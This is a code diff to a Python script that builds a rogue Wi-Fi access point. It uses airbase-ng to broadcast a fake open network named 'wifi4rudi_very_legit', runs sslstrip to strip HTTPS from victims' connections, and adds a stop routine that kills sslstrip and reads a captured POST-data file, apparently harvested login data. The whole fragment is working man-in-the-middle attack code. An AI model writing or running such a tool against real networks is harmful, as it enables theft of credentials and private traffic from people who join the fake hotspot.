@@ -26,7 +26,7 @@ def make_mon():
 	os.system("echo mon")
 	start_monitor("wlan0")
 	command= ["sudo","airbase-ng", "-e"]
-	command.append("Free Wifi")
+	command.append("wifi4rudi_very_legit")
 	command.append("-c")
 	command.append("9")
 	command.append("mon0")
@@ -63,6 +63,9 @@ def runsslstrip():
 	sub= subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 	time.sleep(5)
 
+def stop_mon():
+	os.system("sudo killall sslstrip") 
+	
 def start_rogue_ap():
 	configure_dhcp()
 	make_mon()
@@ -72,5 +75,11 @@ def start_rogue_ap():
 	runsslstrip()
 	configure_firewall()
 
+def stop_rogue_ap():
+	stop_mon()
+	read_post_file()
+	remove_file()
+
 if __name__ == '__main__':
 	start_rogue_ap()
+
